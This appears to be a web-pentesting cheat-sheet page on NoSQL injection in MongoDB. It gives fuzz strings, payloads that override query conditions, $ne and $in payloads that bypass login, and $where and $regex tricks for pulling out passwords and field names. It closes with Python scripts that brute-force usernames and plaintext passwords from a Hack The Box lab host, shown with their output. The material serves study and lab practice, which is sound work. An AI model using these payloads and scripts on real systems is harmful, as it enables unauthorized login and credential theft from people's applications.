---
title: NoSQL Injection (NoSQLi)
category: Web
order: 4
---

NoSQL injection attacks can be especially dangerous because code

# Introduction

NoSQL injection vulnerabilities allow attackers to inject code into commands for databases that don’t use SQL queries, such as MongoDB. NoSQL injection attacks can be especially dangerous because code is injected and executed on the server in the language of the web application, potentially allowing arbitrary code execution.

## Types of NoSQLi

There are two different types of NoSQLi:

* **Syntax injection**: This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.
* **Operator injection**: This occurs when you can use NoSQL query operators to manipulate queries.


# NoSQL Syntax injection

We can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this we can systematicaally test each input by submitting fuzz strings and special characters that trigger a databaase error.

## Detecting syntax injection in MongoDB

To test whether the input may be vulnerable, submit a fuzz string.

Example of fuzzing:
```
'"`{\n;$Foo}\n$Foo \xYZ
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

### Determining which characters are processed

To determine which characters are interpreted as syntax by the application, you can inject indiviual characters.

Confirm the behaviour with `'` and a escaped `\'`. If we have different responses we may have a NoSQLi. 

```
this.category == '''
this.category == '\''
```

### Confirming conditional behaviour

After detecting the vulnerability, the next step is to determine whether you can influence boolena conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. Examples:

```
' && 0 && 'x
' && 1 && 'x
```

Example:

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

### Overriding existing conditions

We can override the existing condition to a TRUE in order to exploit the vulnerability and get more results.

```
'||'1'=='1
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
this.category == 'fizzy'||'1'=='1'
```

### Break the sentence

We can also add a null character to break the original query.

```
test'%00
test'\u0000
```

# NoSQL Operator injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include: 

* `$where`: Matches documents that satisfy an expression.
* `$ne`: Matches all values are not equal to a specified value.
* `$in`: Matches all of the values specified in an array.
* `$regex`: Selects documents where values matches to an spceified regular expression.

## Submitting query operators

In JSON bodies we can use instead of `{"username":"benjugat"}`:

```JSON
{"username":{"$ne":"invalid"}}
```

For URL-base inputs instead of `username=benjugat`:

```
username[$ne]=invalid
```

> **Note**: Try to convert `GET` requests to `POST` with `application/json` as a content type header.

## Detecting operator injection in MongoDB

Consider a vulnerable app that accepts a username and password in the body of a `POST` request `{"username":"benjugat","password":"MyS3curePwd"}`.

Test each input with the `$ne` operator.

```JSON
{"username":{"$ne":"Invalid"},"password":"MyS3curePwd"}
{"username":"benjugat","password":{"$ne":"Invalid"}}
```

If the query is applied it will search all the usernames or passwords that are not equal to `Invalid`.

The following payloads allows you to **bypass authentication**.

```JSON
{"username":{"$ne":"Invalid"},"password":{"$ne":"Invalid"}}
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

# Exploiting syntax injection to extract data

In many noSQL databases, some query operators or functions can run limited JavaScript code.


## Exfiltrating data in MongoDB

Consider a vulnerable app that allows users to look up other registered usernames and displays their role.

```
https://example.com/user/lookup?username=benjugat
```

This results in the following NoSQL query:

```
{"$where":"this.username == 'admin'"}
```

We can attempt to inject JS code to query and return sensitive data.

```
admin' && this.password[0] == 'a' || 'a'=='b
```

We can also use the JS `match()` function to extract information such as identify if the password contains digits.

```
admin' && this.password.match(/\d/) || 'a'=='b
```

## Identifying field names

To identify whether the MongoDB database contains a `password` field, you could submit the following payload:

```
admin' && this.password!=' 
```

> **Note**: Make a bruteforce to identify some parameters of the class. 

> **Note**: We can use alternatively use NoSQL operator injection to extract field names.


# Exploiting operator injection to extract data

Consider a vulnerable application that accepts username and password in the body of a POST request: 

```
{"username":"benjugat","password":"MyS3curePwd"}
```

To test whether you can inject operators, we can try to add the `$where` operator as an additional parameter, send one request where the condition is TRUE and another one FALSE.

```
{"username":"benjugat","password":"MyS3curePwd", "$where":"0"}
{"username":"benjugat","password":"MyS3curePwd", "$where":"1"}
```

## Extracting field names

We can use the `keys()` method to extract the name of data fields.

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Bruteforce all characters of every key.

```
"$where":"Object.keys(this)[0].match('^.{§§}§§.*')"
Payload 1 -> 0-20
Payload 2 -> All chars
```

Do this to every key.

```
"$where":"Object.keys(this)[0].match('^.{§0§}§a§.*')"
"$where":"Object.keys(this)[1].match('^.{§0§}§a§.*')"
"$where":"Object.keys(this)[2].match('^.{§0§}§a§.*')"
"$where":"Object.keys(this)[3].match('^.{§0§}§a§.*')"
```

Once retrieved bruteforce the value of a key.

```
"$where":"this.resetPwdToken.match('^.{§0§}§a§.*')"
```


# Login Bypass (PHP)

Injecting the `$ne` :

```
#Find some one where username not equals to "" and password not equals to ""
username[$ne]=&password[$ne]=&login=login
```

## Dumping Database (PHP)

First instead of `$ne` we are going to use `$regex` in order to discover character by character.

### Get all Usernames

First we are going to see al type of characters used in the usernames.

```
import sys, os, requests, codecs
import string

s = requests.Session()


for char in string.ascii_lowercase:

	regex = '{}.*'.format(char)
	data_post = {
		"username[$regex]" : regex,
		"password[$ne]" : "password",
		"login" : "login"
	}
	resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
	if resp.status_code == 302:
		print("Valid letter: " + char)
```

> **Regex:** {}.\*

```
❯ python3 exploit.py
Valid letter: a
Valid letter: d
Valid letter: g
Valid letter: i
Valid letter: m
Valid letter: n
Valid letter: o
```

Secondly, we are going to check which one goes at firs position:

```
import sys, os, requests, codecs
import string

s = requests.Session()

valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o']

for char in valid_letters:

	regex = '^{}.*'.format(char)
	data_post = {
		"username[$regex]" : regex,
		"password[$ne]" : "password",
		"login" : "login"
	}
	resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
	if resp.status_code == 302:
		print("Starts with: " + char)
```

> **Regex:** ^{}.\* ^ Indicates starts with

```
❯ python3 exploit.py
Starts with: a
Starts with: m
```

Finally we are going to loop until fails all characters used.

```
import sys, os, requests, codecs
import string

s = requests.Session()

def nextLetter(word):
	valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o']
	for char in valid_letters:

		regex = '^{}.*'.format(word+char)
		data_post = {
			"username[$regex]" : regex,
			"password[$ne]" : "password",
			"login" : "login"
		}
		resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
		if resp.status_code == 302:
			return char
	return None

def getUser(start):

	name = start
	while True:
		l = nextLetter(name)
		if l is None:
			break;
		else:
			name += l
	return name

startsWith = ['a', 'm']
for char in startsWith:
	print('Username: ' + getUser(char))
```

```
❯ python3 enum_letters.py
Username: admin
Username: mango
```

### Get Passwords:

Same as users but remember to change the `$regex` of the user to `$ne` and the other way with password.

```
import sys, os, requests, codecs
import string

s = requests.Session()

def nextLetter(user, word):

	special_char = ['^','*', '$', '|', '.','\\' ,'+','?']
	for char in string.printable:
		if char in special_char:
			continue;
		regex = '^{}.*'.format(word+char)
		data_post = {
			"username" : user,
			"password[$regex]" : regex,
			"login" : "login"
		}
		resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
		if resp.status_code == 302:
			return char
	return None

def getPass(user):

	passw = ""
	while True:
		l = nextLetter(user, passw)
		if l is None:
			break;
		else:
			passw += l
	return passw

users = ['admin', 'mango']
for user in users:
	print('Username: ' + user + ' Password: ' + getPass(user))
```

```
❯ python3 exploit.py
Username: admin Password: t9KcS3>!0B#2
Username: mango Password: h3mXK8RhU~f{]f5H
```

> **Remember:** Escape characters that could lead to problems with a regex.